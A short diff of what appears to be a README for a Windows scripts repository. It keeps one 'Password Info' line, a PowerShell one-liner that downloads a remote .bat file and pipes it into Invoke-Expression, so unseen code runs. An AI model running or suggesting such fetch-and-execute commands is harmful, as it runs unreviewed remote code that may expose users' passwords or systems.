@@ -1,5 +1,3 @@
-# windows
-
 Scripts
 --
 Password Info: Invoke-RestMethod -Uri https://github.com/scriptsbu/windows/raw/main/3.bat | Invoke-Expression
